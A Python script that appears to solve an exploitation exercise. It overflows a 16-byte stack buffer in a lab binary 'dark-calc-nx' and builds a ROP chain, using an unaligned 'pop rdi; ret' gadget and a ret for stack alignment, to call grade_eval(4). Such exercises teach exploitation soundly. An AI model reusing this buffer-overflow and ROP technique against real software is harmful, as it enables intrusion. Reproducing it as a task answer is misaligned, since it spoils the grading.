#!/usr/bin/env python3
"""Task 4: ROP on dark-calc-nx to call grade_eval(4)."""
import struct
import sys

# 0x401a33 is an unaligned 5f c3 inside __libc_csu_init:
#   0x401a32: 41 5f   pop r15
#   0x401a34: c3      ret
# Starting one byte later decodes as "pop rdi; ret".
POP_RDI_RET = 0x401A33
# A plain ret gadget, used to fix the stack alignment before grade_eval.
RET = 0x401A34
GRADE_EVAL = 0x401978

# input()'s frame: 16-byte buffer, 8-byte saved rbp, then the return address.
# The ROP chain starts at offset 24.
chain = (
    struct.pack("<Q", POP_RDI_RET)
    + struct.pack("<Q", 4)          # rdi = 4
    + struct.pack("<Q", RET)        # align rsp for grade_eval
    + struct.pack("<Q", GRADE_EVAL)
)
payload = b"A" * 0x18 + chain

assert len(payload) == 0x38
assert b"\n" not in payload

sys.stdout.buffer.write(payload)
